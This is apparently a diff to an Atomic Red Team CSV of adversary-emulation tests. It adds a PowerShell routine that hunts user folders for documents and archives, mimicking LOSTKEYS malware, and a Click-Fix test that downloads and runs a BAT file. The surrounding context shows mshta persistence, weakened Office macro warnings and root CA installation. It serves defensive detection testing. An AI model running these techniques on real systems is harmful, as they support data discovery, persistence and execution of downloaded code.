@@ -21345,15 +21345,15 @@ input_arguments.output_file.type: path
 input_arguments.output_file.default: /tmp/T1083.txt
 
 "
-T1083,File and Directory Discovery,Simulating MAZE Directory Enumeration,c6c34f61-1c3e-40fb-8a58-d017d88286d8,"This test emulates MAZE ransomware's ability to enumerate directories using Powershell. 
-Upon successful execution, this test will output the directory enumeration results to a specified file, as well as display them in the active window. 
+T1083,File and Directory Discovery,Simulating MAZE Directory Enumeration,c6c34f61-1c3e-40fb-8a58-d017d88286d8,"This test emulates MAZE ransomware's ability to enumerate directories using Powershell.
+Upon successful execution, this test will output the directory enumeration results to a specified file, as well as display them in the active window.
 See https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents
 ",windows,,,"$folderarray = @(""Desktop"", ""Downloads"", ""Documents"", ""AppData/Local"", ""AppData/Roaming"")
 Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}
 Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append #{File_to_output}
 Get-ChildItem -Path ""${env:ProgramFiles(x86)}"" -erroraction silentlycontinue | Out-File -append #{File_to_output}
 $UsersFolder = ""$env:homedrive\Users\""
-foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) 
+foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue)
 {
 foreach ($secondarydirectory in $folderarray)
  {Get-ChildItem -Path ""$UsersFolder/$directory/$secondarydirectory"" -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}}
@@ -21435,6 +21435,67 @@ T1083,File and Directory Discovery,Identifying Network Shares - Linux,361fe49d-0
 Attackers may then attempt to access these shares for lateral movement or data exfiltration.
 ",linux,,,"findmnt -t nfs
 ",sh,,,,,,
+T1083,File and Directory Discovery,Recursive Enumerate Files And Directories By Powershell,95a21323-770d-434c-80cd-6f6fbf7af432,"Adversary attempting to discover and collect sensitive documents and archives
+from a user’s system. The test recursively enumerates common user folders
+(Documents, Downloads, Desktop, OneDrive) for file types of interest such as .pdf, .doc,
+.docx, .xls, .xlsx, .txt, .zip, .rar, and .7z.
+This behavior is similar to malware like LOSTKEYS used by COLDRIVER in January 2025,
+where attackers perform targeted file discovery to support strategic intelligence collection https://www.zscaler.com/blogs/security-research/coldriver-updates-arsenal-baitswitch-and-simplefix.
+",windows,,,"$out = ""#{output_file}""
+$dirsFilter = @('Documents','Downloads','Desktop','OneDrive')
+$exts = @('.pdf','.doc','.docx','.xls','.xlsx','.txt','.zip','.rar','.7z')
+$userProfile = [Environment]::GetFolderPath('UserProfile')
+$tr = [System.Collections.Generic.List[string]]::new()
+
+function MatchesExtension($path) {
+  try {
+    $e = [System.IO.Path]::GetExtension($path).ToLower()
+    return $exts -contains $e
+  } catch { return $false }
+}
+
+function Scan-Dir($root) {
+  try {
+    $match = $false
+    foreach ($f in $dirsFilter) { if ($root -like ""*$f*"") { $match = $true; break } }
+    if (-not $match) { return }
+
+    [System.IO.Directory]::EnumerateFiles($root) | ForEach-Object {
+      if (MatchesExtension $_) {
+        $fi = [System.IO.FileInfo]::new($_)
+        $tr.Add(""[File] $_ Size:$($fi.Length) LastWrite:$($fi.LastWriteTime)"")
+      }
+    }
+
+    [System.IO.Directory]::EnumerateDirectories($root) | ForEach-Object {
+      Scan-Dir $_
+    }
+  } catch [System.UnauthorizedAccessException] {
+    $tr.Add(""[AccessDenied] $root"")
+  } catch {
+    $tr.Add(""[Error] $root => $($_.Exception.Message)"")
+  }
+}
+
+[System.IO.Directory]::EnumerateDirectories($userProfile) | ForEach-Object { Scan-Dir $_ }
+
+# Ensure output dir exists
+$outDir = [System.IO.Path]::GetDirectoryName($out)
+if (-not [string]::IsNullOrEmpty($outDir) -and -not (Test-Path $outDir)) {
+  New-Item -Path $outDir -ItemType Directory -Force | Out-Null
+}
+
+# Write results
+$tr | Out-File -FilePath $out -Encoding UTF8
+Write-Output ""Enumeration complete. Results written to: $out""
+",powershell,,,"Remove-Item -Path ""#{output_file}"" -ErrorAction SilentlyContinue
+",,,"input_arguments.output_file.description: File to output results.
+
+input_arguments.output_file.type: string
+
+input_arguments.output_file.default: $env:TEMP\T1083-Enumerate-net.txt
+
+"
 T1553.004,Subvert Trust Controls: Install Root Certificate,Install root CA on CentOS/RHEL,9c096ec4-fd42-419d-a762-d64cc950627e,"Creates a root CA with openssl
 ",linux,,,"openssl genrsa -out #{key_filename} 4096
 openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj ""/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com"" -out #{cert_filename}
@@ -27983,7 +28044,7 @@ taskkill /IM a.exe /F
 $file2 = ""$env:Temp\a.exe""
 Remove-Item $file1 -ErrorAction Ignore
 Remove-Item $file2 -ErrorAction Ignore",,,
-T1204.002,User Execution: Malicious File,Mirror Blast Emulation,24fd9719-7419-42dd-bce6-ab3463110b3c,"Emulates the JS -> MSI chain of the MirrorBlast T505 campaign by executing an xlsm file designed. 
+T1204.002,User Execution: Malicious File,Mirror Blast Emulation,24fd9719-7419-42dd-bce6-ab3463110b3c,"Emulates the JS -> MSI chain of the MirrorBlast T505 campaign by executing an xlsm file designed.
 Requires the 32 bit version of Office to run. [MirrorBlast Campaign Analysis](https://blog.morphisec.com/explosive-new-mirrorblast-campaign-targets-financial-companies)
 ",windows,,,"Cd ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs""
 New-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security -Name ""VBAWarnings"" -Value ""1"" -PropertyType DWORD -Force | Out-Null
@@ -27993,6 +28054,30 @@ This technique relies on user interaction (Win+R + Enter) to trigger execution.
 Used in social engineering campaigns that aim to bypass traditional startup methods.
 Reference: https://www.netskope.com/blog/lumma-stealer-fake-captchas-new-techniques-to-evade-detection
 ",windows,,,"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"" -Name ""atomictest"" -Value '""C:\Windows\System32\mshta.exe"" http://localhost/hello6.hta'",powershell,,,"Remove-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"" -Name ""atomictest"" -ErrorAction SilentlyContinue",,,
+T1204.002,User Execution: Malicious File,Simulate Click-Fix via Downloaded BAT File,22386853-f68d-4b50-a362-de235127c443,"Simulates user execution of a BAT file downloaded from the Atomic Red Team GitHub repository.This test represents T1204.002 - User Execution via Malicious File.The BAT file performs harmless terminal output to simulate a ""fix"" operation.",windows,,,"$url = ""#{url}""
+$outfile = ""#{outfile}""
+Invoke-WebRequest -Uri $url -OutFile $outfile -UseBasicParsing
+$process = Start-Process -FilePath $outfile -PassThru -WindowStyle Normal
+$process.Id | Out-File ""$env:TEMP\click-fix-pid.txt""
+",powershell,False,,"if (Test-Path ""$env:TEMP\click-fix-pid.txt"") {
+  $pid = Get-Content ""$env:TEMP\click-fix-pid.txt""
+  Stop-Process -Id $pid -Force -ErrorAction SilentlyContinue
+  Remove-Item ""$env:TEMP\click-fix-pid.txt"" -ErrorAction SilentlyContinue
+}
+Remove-Item ""#{outfile}"" -ErrorAction SilentlyContinue
+",,,"input_arguments.url.description: URL to download the BAT file from
+
+input_arguments.url.type: url
+
+input_arguments.url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/click-fix.bat
+
+input_arguments.outfile.description: Path where the BAT file will be saved
+
+input_arguments.outfile.type: path
+
+input_arguments.outfile.default: $env:TEMP\click-fix.bat
+
+"
 T1546.007,Event Triggered Execution: Netsh Helper DLL,Netsh Helper DLL Registration,3244697d-5a3a-4dfc-941c-550f69f91a4d,"You can register a ""helper dll"" with Netsh as a persistance mechanism. The code in the dll is executed every time netsh.exe is called.
 The NetshHelper.dll provided with the atomic will simply launch notepad when netsh.exe is run.
 
